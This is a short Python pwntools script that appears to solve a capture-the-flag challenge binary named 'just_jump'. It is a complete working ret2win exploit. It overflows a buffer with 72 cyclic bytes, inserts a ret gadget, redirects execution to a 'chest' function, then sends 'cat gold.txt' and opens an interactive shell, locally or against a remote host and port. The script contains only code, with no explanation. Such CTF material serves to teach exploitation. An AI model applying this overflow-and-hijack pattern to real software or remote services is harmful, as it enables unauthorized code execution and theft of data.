from pwn import *
import os

os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

exe = './just_jump'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'INFO'

sh = start()
rop = ROP(elf)
p = flat([
    cyclic(72),
    rop.find_gadget(['ret']).address,
    elf.sym['chest']
])
sh.sendlineafter(b'>', b'3')
# gdb.attach(sh)
sh.sendlineafter(b':', p)
sh.sendline(b'cat gold.txt')

sh.interactive()